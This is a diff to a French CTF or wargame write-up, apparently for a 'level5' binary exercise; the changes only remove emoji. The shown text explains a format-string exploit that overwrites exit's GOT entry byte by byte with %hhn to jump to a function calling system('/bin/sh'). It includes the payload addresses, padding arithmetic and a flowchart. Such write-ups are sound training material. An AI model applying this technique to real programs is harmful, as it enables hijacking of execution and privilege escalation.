@@ -41,7 +41,7 @@ On n'a besoin que des deux adresses fixes. L'ASLR ne touche que la libc.
 ```
 1. lancement : la GOT est préparée (exit → vraie adresse libc)
 2. printf(input) : notre format string s'exécute -> on réécrit la ligne exit → o()
-3. exit(1) : lit la ligne exit dans GOT -> trouve o() -> saute dans o() -> shell 🎉
+3. exit(1) : lit la ligne exit dans GOT -> trouve o() -> saute dans o() -> shell 
 ```
 
 Notre écriture (étape 2) arrive APRÈS la préparation (1) et AVANT l'appel (3). Rien
@@ -113,7 +113,7 @@ compteur courant → on ajoute 256 à chaque cible.
 
 Avec `%hn` (2 octets), les paddings atteignaient ~34 000 caractères. Mais `fgets`
 limite le buffer à **512 octets** → payload trop grand, format specifiers jamais lus.
-Avec `%hhn` (1 octet), les paddings totalisent ~444 octets → rentre dans 512. ✓
+Avec `%hhn` (1 octet), les paddings totalisent ~444 octets → rentre dans 512. 
 
 ```
 ordre   valeur   case       adresse          position   compteur cible
@@ -159,13 +159,13 @@ python -c 'print "\x3a\x98\x04\x08\x3b\x98\x04\x08\x39\x98\x04\x08\x38\x98\x04\x
 "\x38\x98\x04\x08"   adresse exit+0 → position 7
 (16 octets, compteur = 16)
 
-"a"*244  + "%4$hhn"   compteur 260  -> 260 % 256 = 4   -> exit+2 = 0x04  ✓
-"a"*4    + "%5$hhn"   compteur 264  -> 264 % 256 = 8   -> exit+3 = 0x08  ✓
-"a"*124  + "%6$hhn"   compteur 388  -> 388 % 256 = 132 -> exit+1 = 0x84  ✓
-"a"*32   + "%7$hhn"   compteur 420  -> 420 % 256 = 164 -> exit+0 = 0xa4  ✓
+"a"*244  + "%4$hhn"   compteur 260  -> 260 % 256 = 4   -> exit+2 = 0x04  
+"a"*4    + "%5$hhn"   compteur 264  -> 264 % 256 = 8   -> exit+3 = 0x08  
+"a"*124  + "%6$hhn"   compteur 388  -> 388 % 256 = 132 -> exit+1 = 0x84  
+"a"*32   + "%7$hhn"   compteur 420  -> 420 % 256 = 164 -> exit+0 = 0xa4  
 
 résultat : GOT[exit] = 0xa4 0x84 0x04 0x08 = 0x080484a4 = adresse de o()
-exit(1) → o() → system("/bin/sh") → shell level6 🎉
+exit(1) → o() → system("/bin/sh") → shell level6 
 ```
 
 ### 1. Flow global de l'exploit
@@ -174,7 +174,7 @@ exit(1) → o() → system("/bin/sh") → shell level6 🎉
 flowchart TD
     A([Lancement de level5]) --> B["main appelle n()"]
     B --> C["fgets buf, 0x200, stdin<br/>→ lit NOTRE payload"]
-    C --> D["printf(buf)<br/>⚠️ FAILLE format string<br/>buf est interprété comme format"]
+    C --> D["printf(buf)<br/>️ FAILLE format string<br/>buf est interprété comme format"]
     D --> E{"Le payload contient<br/>%c + %hhn"}
     E --> F["printf écrit l'adresse de o()<br/>dans la GOT de exit<br/>(octet par octet)"]
     F --> G["printf se termine"]
@@ -182,7 +182,7 @@ flowchart TD
     H --> I{"exit consulte sa case GOT<br/>0x08049838 pour savoir<br/>où sauter"}
     I -->|"GOT écrasée !"| J["saute dans o()<br/>0x080484a4"]
     J --> K["o() fait system('/bin/sh')"]
-    K --> L([🎉 SHELL avec droits level6])
+    K --> L([ SHELL avec droits level6])
 
     style D fill:#ff6b6b,stroke:#333,color:#fff
     style F fill:#ffa94d,stroke:#333
